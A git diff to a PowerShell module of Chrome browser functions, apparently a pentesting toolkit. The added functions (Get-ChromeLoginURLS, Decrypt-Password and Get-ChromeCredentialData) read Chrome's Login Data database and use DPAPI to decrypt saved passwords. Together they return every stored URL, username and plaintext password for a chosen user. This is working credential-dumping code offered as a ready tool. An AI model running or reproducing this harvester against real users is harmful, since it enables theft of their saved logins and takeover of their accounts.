@@ -1,4 +1,4 @@
-﻿Function Get-ChromeBookmarks {
+Function Get-ChromeBookmarks {
     <#
     .SYNOPSIS
         Returns the Chrome bookmark entries
@@ -80,6 +80,45 @@ Function Scrape-ChromeHistory {
     }
 }
 
+Function Get-ChromeLoginURLS {
+    <#
+    .SYNOPSIS
+        Returns the URLs and Usernames listed in the Chrome login_data file.
+        Author: Jake Miller (@LaconicWolf) 
+        Required Dependencies: None
+    .DESCRIPTION
+        Queries the login_data file and returns the URLs and usernames.
+    .PARAMETER UserName
+        Specifies which User's login_date file will be queried. Defaults
+        to $env:USERNAME.
+    .EXAMPLE
+        PS C:\> Get-ChromeLoginURLS
+        Will return all URLs and usernames within the login_data file.
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false)]
+        $UserName = $env:USERNAME
+    )
+
+    $module = Get-Module -List PSSQLite
+
+    if (!$module) {
+        Write-Host "`nUnable to locate the PSSQLite module. Exiting." -ForegroundColor Yellow
+        return
+    }
+    Import-Module PSSQLite
+
+    $SQLiteDbPath = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+
+    if (-not (Test-Path -Path $SQLiteDbPath)){
+        Write-Verbose "[*] Could not find the Chrome Login_data file for user: $UserName"
+        return
+    }
+
+    Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT origin_url, username_value FROM logins"
+    
+}
 
 
 Function Get-ChromeHistory {
@@ -221,5 +260,78 @@ Function Get-ChromeHistory {
         Write-Output "`nNo options specified. Dumping database.`n"
         Start-Sleep -Seconds 3
         Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT * FROM urls"
+    }
+}
+
+
+Function Decrypt-Password {
+    <#
+    .SYNOPSIS
+        Helper function that uses the DPAPI to decrypt Chrome passwords.
+        Author: Jake Miller (@LaconicWolf). Adapted from https://github.com/p0z/CPD/blob/master/Chrome_Passwords_Decryptor.ps1 
+    .DESCRIPTION
+        Uses the DPAPI to decrypt Chrome passwords.
+    #>
+    
+    Param(
+        [Parameter(Mandatory = $true)]
+        $EncryptedPassword
+    )
+
+    $DecryptedChars = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedPassword.password_value, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
+    foreach ($char in $DecryptedChars) {
+        $password += [Convert]::ToChar($char)
+    }
+    return $password
+} 
+
+Function Get-ChromeCredentialData {
+    <#
+    .SYNOPSIS
+        Returns the URLs and Usernames listed in the Chrome login_data file.
+        Author: Jake Miller (@LaconicWolf) Adapted from https://github.com/p0z/CPD/blob/master/Chrome_Passwords_Decryptor.ps1 
+        Required Dependencies: PSSQLITE
+    .DESCRIPTION
+        Queries the login_data file and returns the URLs and usernames.
+    .PARAMETER UserName
+        Specifies which User's login_date file will be queried. Defaults
+        to $env:USERNAME.
+    .EXAMPLE
+        PS C:\> Get-ChromeLoginURLS
+        Will return all URLs and usernames within the login_data file.
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false)]
+        $UserName = $env:USERNAME
+    )
+
+    $module = Get-Module -List PSSQLite
+
+    if (!$module) {
+        Write-Host "`nUnable to locate the PSSQLite module. Exiting." -ForegroundColor Yellow
+        return
+    }
+    Import-Module PSSQLite
+
+    $SQLiteDbPath = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+
+    if (-not (Test-Path -Path $SQLiteDbPath)){
+        Write-Verbose "[*] Could not find the Chrome Login_data file for user: $UserName"
+        return
+    }
+
+    $data = Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT origin_url, username_value, password_value FROM logins" 
+    $data | ForEach-Object {
+        $url = $_.origin_url
+        $username = $_.username_value
+        $password = Decrypt-Password -EncryptedPassword $_
+        if ($username -or $password) {
+            New-Object -TypeName PSObject -Property @{
+                URL = $url
+                USERNAME = $username
+                PASSWORD = $password
+            }
+        }
     }
 }
